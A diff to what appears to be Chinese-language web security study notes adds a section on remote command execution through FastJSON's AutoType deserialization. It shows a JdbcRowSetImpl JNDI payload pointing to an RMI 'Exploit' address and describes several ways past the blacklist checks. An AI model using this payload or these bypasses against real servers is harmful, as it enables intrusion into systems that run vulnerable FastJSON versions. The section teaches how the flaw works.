@@ -214,6 +214,71 @@ DDOS又称为分布式拒绝服务，全称是：Distributed Denial of Services�
 # 十、计时攻击
 
 
+# 十一、远程命令执行漏洞
+
+所谓的远程命令执行漏洞，即利用漏洞入侵到目标服务器，通过服务器执行命令
+
+## 1、FastJSON
+
+- [FastJson远程执行漏洞原因](https://mp.weixin.qq.com/s/E7B69TTIqXvDplZmlnqFBQ)
+
+FastJson频繁报远程执行的漏洞，AutoType引起的。
+
+### 1.1、FastJson序列化机制
+
+fastjson在序列化以及反序列化的过程中并没有使用Java自带的序列化机制，而是自定义了一套机制。
+
+对于JSON框架来说，想要把一个Java对象转换成字符串，可以有两种选择：
+- 基于属性
+- 基于setter/getter
+
+常见的json序列化框架中，FastJson和jackson在把对象序列化成json字符串的时候，是通过遍历出该类中的所有getter方法进行的。Gson并不是这么做的，他是通过反射遍历该类中的所有属性，并把其值序列化成json。
+
+**当一个类中包含了一个接口（或抽象类）的时候，在使用Fastjson进行序列化的时候，会将子类型抹去，只保留接口（抽象类）的类型，使得反序列化时无法拿到原始类型！**
+
+为了解决拿不到原始类型的问题，FastJson引入了AutoType，即在序列化的时候，把原始类型记录下来。使用方法是通过`SerializerFeature.WriteClassName`进行标记：
+```java
+String jsonString = JSON.toJSONString(store, SerializerFeature.WriteClassName);
+```
+jsonString内容如下：
+```json
+{
+    "@type":"com.blue.fish.example.json.model.Store",
+    "fruit":{
+        "@type":"com.blue.fish.example.json.model.Apple",
+        "price":0.5
+    },
+    "name":"Store"
+}
+```
+也正是这个特性，因为在功能设计之初在安全方面考虑的不够周全，也给后续fastjson使用者带来了无尽的痛苦
+
+### 1.2、AutoType
+
+因为有了autoType功能，那么fastjson在对JSON字符串进行反序列化的时候，就会读取`@type`到内容，试图把JSON内容反序列化成这个对象，并且会调用这个类的setter方法。
+那么就可以利用这个特性，自己构造一个JSON字符串，并且使用`@type`指定一个自己想要使用的攻击类库
+
+而fastjson在反序列化时会调用目标类的setter方法，那么如果黑客在JdbcRowSetImpl的dataSourceName中设置了一个想要执行的命令，那么就会导致很严重的后果。
+如通过以下方式定一个JSON串，即可实现远程命令执行（新版本中JdbcRowSetImpl已经被加了黑名单）
+`{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit","autoCommit":true}`
+
+这就是所谓的`远程命令执行漏洞`，即利用漏洞入侵到目标服务器，通过服务器执行命令。
+
+从v1.2.25开始，fastjson默认关闭了autotype支持，并且加入了checkAutotype，加入了黑名单+白名单来防御autotype开启的情况
+
+### 1.3、攻击方法
+
+在fastjson v1.2.41 之前，在checkAutotype的代码中，会先进行黑白名单的过滤，如果要反序列化的类不在黑白名单中，那么才会对目标类进行反序列化。
+但是在加载的过程中，fastjson有一段特殊的处理，那就是在具体加载类的时候会去掉className前后的L和;，形如Lcom.lang.Thread;
+
+**autoType不开启也能被攻击：**
+
+因为在fastjson中有一个全局缓存，在类加载的时候，如果autotype没开启，会先尝试从缓存中获取类，如果缓存中有，则直接返回。黑客正是利用这里机制进行了攻击，黑客先想办法把一个类加到缓存中，然后再次执行的时候就可以绕过黑白名单检测了
+
+**利用异常进行攻击：**
+
+在fastjson中， 如果，@type 指定的类为 Throwable 的子类，那对应的反序列化处理类就会使用到 ThrowableDeserializer，而在ThrowableDeserializer#deserialze的方法中，当有一个字段的key也是 @type时，就会把这个 value 当做类名，然后进行一次 checkAutoType 检测。并且指定了expectClass为Throwable.class，但是在checkAutoType中，有这样一约定，那就是如果指定了expectClass ，那么也会通过校验。因为fastjson在反序列化的时候会尝试执行里面的getter方法，而Exception类中都有一个getMessage方法，黑客只需要自定义一个异常，并且重写其getMessage就达到了攻击的目的
 
 # 参考资料
+
 * 《白帽子讲Web安全》
